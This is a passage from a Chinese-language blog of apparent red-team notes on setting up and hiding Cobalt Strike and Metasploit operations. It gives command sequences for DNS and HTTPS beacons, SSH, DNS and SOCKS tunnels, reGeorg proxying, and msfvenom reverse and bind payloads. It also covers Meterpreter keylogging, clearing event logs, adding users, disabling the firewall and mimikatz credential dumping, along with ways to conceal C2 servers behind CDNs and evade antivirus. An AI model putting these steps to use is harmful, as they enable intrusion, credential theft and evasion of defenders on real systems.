<pre><code> 1.云主机Teamserver配置端口53启用-udp 2.买一个域名修改解析记录如下： A记录-&gt;cs主机名-&gt;CS服务器IP NS记录-&gt;ns1主机名-&gt;上个A记录地址 NS记录-&gt;ns2主机名-&gt;上个A记录地址
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224250921.png" alt="image-20210605224250921" loading="lazy"></figure>
<p>3.配置DNS监听器内容如下：</p>
<pre><code> ns1.xiaodi8.com
 ns2.xiaodi8.com
 cs.xiaodi8.com
</code></pre>
<p>生产木马</p>
<figure data-type="image" tabindex="7"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224428694.png" alt="image-20210605224428694" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224447100.png" alt="image-20210605224447100" loading="lazy"></figure>
<p>4.生成后门执行上线后启用命令：</p>
<figure data-type="image" tabindex="9"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605223622250.png" alt="image-20210605223622250" loading="lazy"></figure>
<p>点击黑色的机器右键执行如下命令</p>
<pre><code> beacon&gt; checkin [*] Tasked beacon to checkin beacon&gt; mode dns-txt [+] data channel set to DNS-TXT [+] host called home, sent: 8 bytes beacon&gt; shell whoami [*] Tasked beacon to run: whoami [+] host called home, sent: 53 bytes [+] received output: xiaodi-pc\xiaodi
</code></pre>
<h3 id="案例5-cs的shell-msf的shell">案例5-CS的SHELL-&gt;MSF的SHELL</h3>
<p>CS-&gt;MSF</p>
<p>https://blog.csdn.net/qq_39611230/article/details/114498841</p>
<h3 id="案例6-ssh隧道动态静态端口转发">案例6-SSH隧道（动态/静态端口转发）</h3>
<ul>
<li>本地端口转发：相当于拉数据，本地从跳板机拉取数据（内网拉取外网数据）</li>
</ul>
<pre><code>目标机
  ssh -CfNg -L (攻击机开放的端口):(目标主机IP地址):(目标端口) root@攻击机IP
  ssh -CfNg -L 8888:百度IP:80 root@192.168.0.2 

攻击机
  开启ssh即可
</code></pre>
<ul>
<li>远程端口转发：相当于推数据，跳板机把数据推到本地(访问内网)</li>
</ul>
<pre><code>目标机
  ssh -CfNg -R (攻击机开放的端口):(目标主机IP地址):(目标端口) root@攻击机IP
攻击机
  开启ssh即可，可以在攻击机上访问
</code></pre>
<ul>
<li>动态端口转发</li>
</ul>
<pre><code>VPS
    ssh -CfNg -D 8888 root目标机器IP
      输入密码即可链接
        浏览器开启SOCKS5代理
  目标机
    开启SSH
翻墙可以使用哦
</code></pre>
<ul>
<li>更改默认端口逃避防火墙</li>
</ul>
<pre><code>更改默认端口22
  /etc/ssh/sshd_config 　　– PermitRootLogin yes 　　– Port 53　　
  // ssh的默认端口是22，改为53是假设防火墙的规则设定的比较死，只允许出站的流量为53的情况下，ssh隧道建立的端口就为53 　　– PasswordAuthentication yes 
  service sshd restart
</code></pre>
<h3 id="案例7-dns隧道隧道技术">案例7-DNS隧道（隧道技术）</h3>
<pre><code>目标机
    iodine -f -r 192.168.0.1 test.com。替换192.168.0.1为服务器的IP地址。
阿里云域名解析
    域名解析
      A记录
        设置一个子域名的DNS服务器地址
          服务器地址指向我们的KALI
      NS记录
        添加一个子域名

在您的服务器上，运行：./iodined -f 10.0.0.1 test.com。如果您已经在使用10.0.0.0网络，请使用另一个内部网络，如 172.16.0.0。

iodine工具：https://github.com/yarrick/iodine
</code></pre>
<h3 id="案例8-socks代理隧道技术">案例8-socks代理（隧道技术）</h3>
<p>socks是一种代理服务，可以说是一个升级版的lcx</p>
<pre><code>socks协议中有交互协议，当访问某个网站的时候，浏览器会把被访问目标的URL和服务端口交给socks服务端进行解析，socks服务端解析后代替浏览器去访问目标网站，将结果返回给浏览器
端口转发的话是帮忙访问主机的某个端口，一对一，而socks是不需要知道访问哪个端口，一对多
</code></pre>
<pre><code>代表工具：EarthWorm（蚯蚓）
下载连接 https://github.com/rootkiter/EarthWorm
https://codeload.github.com/idlefire/ew/zip/master
所有讲内网穿透的，都绕不开这个工具，两大功能：socks5服务端和端口转发，用于网络穿透
还可以用新版的EW 即Termite    http://rootkiter.com/Termite/

推荐两款流行的工具：ngrok和 frp

比较简洁

frp链接：https://github.com/fatedier/frp

也是有客户端服务端的，和EW一样需要自购VPS搭建，具体命令请参考其他师傅们的文章

ngrok国内链接：http://www.ngrok.cc/　　或者去官网　　https://ngrok.com/

用国内的就好

很方便，不用自己搭服务器了

可以注册账号，花钱买隧道（免费的速度堪忧），傻瓜式操作

如果有隐私方面的考虑不建议使用此方法，可以自建服务器用frp

 

 或者使用nps

参考：https://www.jianshu.com/p/cfbed49e1728
</code></pre>
<h3 id="案例9-httphttps协议隧道技术">案例9-HTTP/HTTPS协议（隧道技术）</h3>
<p>reGeorg</p>
<pre><code>reGeorg-----一款正向代理工具，即把代理脚本扔到跳板机上（当然会被杀软干掉的），然后攻击机VPS去连接跳板机下载链接   https://github.com/sensepost/reGeorghttps://www.proxifier.comhttps://github.com/rofl0r/proxychains-nghttp://proxychains.sourceforge.net/参考文章：https://www.cnblogs.com/7-58/p/12932649.htmlhttps://cloud.tencent.com/developer/article/1674107比如proxychains需要vim /etc/proxychains.conf   ，在最后添加一行，具体配合reGeorg端口：　　socks5 127.0.0.1 port
</code></pre>
<p>上传木马</p>
<pre><code>取得跳板机权限了之后，需要把tunnel.什么什么上传到跳板机上（别忘了要扔到web目录里啊），这个什么，取决于跳板机支持什么语言环境（aspx,jsp,php,ashx)

攻击机VPS上执行　　　　python reGeorgSocksProxy.py -u http://公ip2/tunnel.nosocket.php -p port
</code></pre>
<pre><code>话说如果有meterpreter，run get_local_subnets获取网络接口、run autoroute -p 查看路由、run autoroute -s x.x.x.0/24加个路由，
use auxiliary/server/socks4a，set srvport port ,然后按照上面的步骤改proxychains.conf（注意这回用socks4啊，socks4 IP port），也一样能实现将攻击机VPS

“贴”到跳板机上
（补充一点题外话：警告！！！存在多级网络跳跃的情况的时候，即攻击者通过连主机A再到主机B再到主机C......　　注意选择是正向连接目标还是反向连接目标，例如用tcp协议的话，是set payload windows/meterpreter/bind_tcp还是set payload windows/meterpreter/reverse_tcp
目标机器能找到攻击机的话优先选反向reverse，目标机器不能找得到攻击机的话用正向bind
生成后门的时候也注意选择正向后门，例如  msfvenom -p linux/x64/meterpreter/bind_tcp ......还是反向后门 例如 msfvenom -p linux/x64/meterpreter/reverse_tcp......）

 
</code></pre>
<h3 id="案例10-https隧道cscdnhttps">案例10-HTTPS隧道（CS+CDN+HTTPS）</h3>
<p>文章：https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
<p>cloudflare</p>
<figure data-type="image" tabindex="10"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213921268" loading="lazy"></figure>
<p>下载文件</p>
<figure data-type="image" tabindex="11"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213456387.png" alt="image-20210623213456387" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213542566.png" alt="image-20210623213542566" loading="lazy"></figure>
<pre><code>openssl pkcs12 -export -in 1.pem -inkey 1.key -out a.p12 -name cs2.safebug.top -passout pass:123456
</code></pre>
<pre><code>keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore https.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cs2.safebug.top
</code></pre>
<p>完成以上两部</p>
<pre><code>进入cobalt strike目录
[root@ecs-HxXuQ cobaltstrike4.3]# mv cobaltstrike.store cobaltstrike.store.bak
[root@ecs-HxXuQ cobaltstrike4.3]# mv https.store cobaltstrike.store

重启cs
</code></pre>
<p>配置cs</p>
<figure data-type="image" tabindex="13"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213815134" loading="lazy"></figure>
<h2 id="端口转发">端口转发</h2>
<h3 id="meterpreter">meterpreter</h3>
<p>帮助</p>
<pre><code>二、Options：选项
-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。
-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。
-p：TCP连接将转发到的端口。
-r：连接被中继到的IP地址（目标）。
</code></pre>
<pre><code>查看列表
portfwd List

清空列表
portfwd flush
</code></pre>
<p>案例-我们将在我们的本地机器上打开一个端口，并让我们的Meterpreter会话在同一端口上向我们的受害者转发连接。我们将使用端口3389，这是远程桌面连接的Windows默认端口。</p>
<pre><code>端口转发： portfwd add –l 3389 –p 3389 –r 172.16.194.141
</code></pre>
<h2 id="钓鱼技术">钓鱼技术</h2>
<p>[钓鱼攻击之远程加载恶意Word模版文件上线CS ]</p>
<pre><code>https://www.cnblogs.com/zzjdbk/p/14435769.html
</code></pre>
<h2 id="保护自己">保护自己</h2>
<h3 id="一些资料">一些资料</h3>
<p><strong>CobaltStrike上线隐藏|DNS|CDN|云函数</strong></p>
<p>https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
<p>cobalt strike特征隐藏|修改默认端口|去除证书特征|混淆配置</p>
<p>https://www.ddosi.com/cobalt-strike-bypass/</p>
<p>隐藏源IP|提高溯源难度|隐藏cobalt strike服务器</p>
<p>https://www.ddosi.com/c2-hidden/#</p>
<h3 id="cobalt-strike配置隐藏">cobalt strike配置隐藏</h3>
<pre><code>1.更改默认端口
vi teamserver

2.去除证书特征
Cobalt Strike默认的证书已经是分分钟被逮,所以需要生成一个新的证书
这里可以用keytool这个工具。操作简单。Keytool是一个Java数据证书的管理工具,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/1392192-20210520204927340-497762871.png" alt="img" loading="lazy"></figure>
<p>更换证书</p>
<h3 id="cobalt-strike域前置技术">cobalt strike（域前置技术）</h3>
<h3 id="cobalt-strike隐藏技术尽量不使用ip重定向技术">cobalt strike隐藏技术（尽量不使用IP）重定向技术</h3>
<pre><code>DNS服务器-&gt;外网服务器-&gt;teamserver服务器-&gt;kali重定向技术DNS服务器：r1.cs.com解析ip为外网服务器外网服务器:socat转发teamserver服务器：接受数据
</code></pre>
<h3 id="cobalt-strike隐藏技术尽量不使用ipcdn技术">cobalt strike隐藏技术（尽量不使用IP）CDN技术</h3>
<p>godaddy设置</p>
<pre><code>1.购买域名https://dcc.godaddy.com/2.DNS域名服务器设置为cloudflare
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622232348549.png" alt="image-20210622232348549" loading="lazy"></figure>
<p>cloudflare设置</p>
<pre><code>1.注册登录账号2.添加网站设置CDN3.关闭缓存 如下图Cloudflare有个特点，如果用其他端口的话，是监听不到的Cloudflare支持的HTTP端口是：80,8080,8880,2052,2082,2086,2095Cloudflare支持的HTTPs端口是：443,2053,2083,2087,2096,8443
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622210736110.png" alt="image-20210622210736110" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000719412.png" alt="image-20210623000719412" loading="lazy"></figure>
<p>cobalt strike设置</p>
<figure data-type="image" tabindex="18"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000644572.png" alt="image-20210623000644572" loading="lazy"></figure>
<p>自己的参数</p>
<pre><code>阿里云服务器：safebug.top cdn
</code></pre>
<h3 id="cobalt-strike隐藏技术腾讯云函数技术">cobalt strike隐藏技术（腾讯云函数技术）</h3>
<h3 id="配置禁止ip访问服务器仅允许cdn的ip">配置禁止IP访问服务器仅允许CDN的IP</h3>
<pre><code>https://www.bnxb.com/nginx/27638.html
</code></pre>
<h2 id="meterpreter后渗透">meterpreter后渗透</h2>
<h3 id="基本系统命令">基本系统命令</h3>
<pre><code>background   # 将当前会话放置后台sessions   # sessions –h 查看帮助sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话bgrun / run   # 执行已有的模块，输入run后按两下tab，列出已有的脚本info   # 查看已有模块信息getuid   # 查看当前用户身份getprivs  # 查看当前用户具备的权限getpid   # 获取当前进程ID(PID)sysinfo   # 查看目标机系统信息irb   # 开启ruby终端ps   # 查看正在运行的进程    kill &lt;PID值&gt; # 杀死指定PID进程idletime     # 查看目标机闲置时间reboot / shutdown    # 重启/关机shell    # 进入目标机cmd shellexecute -H -i -f  cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互  #执行文件
</code></pre>
<p>进程迁移</p>
<pre><code>getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    # 将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   # 杀死进程
</code></pre>
<p>键盘记录</p>
<pre><code class="language-shell">keyscan_start  # 开始键盘记录keyscan_dump   # 导出记录数据keyscan_stop   # 结束键盘记录
</code></pre>
<p>删除日志</p>
<pre><code class="language-shell">clearev  # 清除windows中的应用程序日志、系统日志、安全日志
</code></pre>
<p>常用cmd命令</p>
<pre><code>whoami  # 当前权限quser  # 查询当前在线的管理员net user  # 查看存在用户net user 用户名 密码 /add  # 添加用户和对应密码net localgroup 用户组名 用户名 /add  # 将指定用户添加到指定用户组netstat -ano  # 查询当前计算机中网络连接通信情况，LISTENING表示该端口处于监听状态；ESTABLISHED表示该端口处于工作（通信）状态systeminfo  # 查看当前计算机中的详细情况tasklist /svc  # 查看每个进程所对应的服务taskkill /f /im 程序名称  # 结束某个指定名称的程序taskkill /f /PID ID  # 结束某个指定PID的进程tasklist | findstr &quot;字符串&quot; # 查找输出结果中指定的内容netsh adcfirewall set allprofiles state off  # 关闭防火墙logoff  # 注销某个指定用户的IDshutdown -r  # 重启当前计算机
</code></pre>
<p>kiwi模块</p>
<pre><code class="language-shell">load kiwicreds_all：列举所有凭据creds_kerberos：列举所有kerberos凭据creds_msv：列举所有msv凭据creds_ssp：列举所有ssp凭据creds_tspkg：列举所有tspkg凭据creds_wdigest：列举所有wdigest凭据dcsync：通过DCSync检索用户帐户信息dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RIDgolden_ticket_create：创建黄金票据kerberos_ticket_list：列举kerberos票据kerberos_ticket_purge：清除kerberos票据kerberos_ticket_use：使用kerberos票据kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令lsa_dump_sam：dump出lsa的SAMlsa_dump_secrets：dump出lsa的密文password_change：修改密码wifi_list：列出当前用户的wifi配置文件wifi_list_shared：列出共享wifi配置文件/编码
</code></pre>
<p>使用mimikatz</p>
<pre><code>load kiwikiwi_cmd mimikatz命令
</code></pre>
<h2 id="cobalt-strike后渗透工具篇">cobalt strike后渗透工具篇</h2>
<p>cobaltstrike插件</p>
<pre><code>https://github.com/hack2fun/BypassAV 绕过AVhttps://github.com/pandasec888/taowu-cobalt-strike  大集合https://github.com/z1un/Z1-AggressorScripts  大集合
</code></pre>
<pre><code>参考资料cobaltstrike云服务器安装https://hackergu.com/cobaltstrike%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E8%A3%85/cs永久运行https://blog.csdn.net/qq_44657899/article/details/114306472
</code></pre>
<pre><code>启动团队服务器nohup ./teamserver 42.193.186.7 ASDqwe123 &amp;
</code></pre>
<p>beacon命令</p>
<pre><code>执行命令： shell  whoami
</code></pre>
]]></content>
    </entry>
</feed>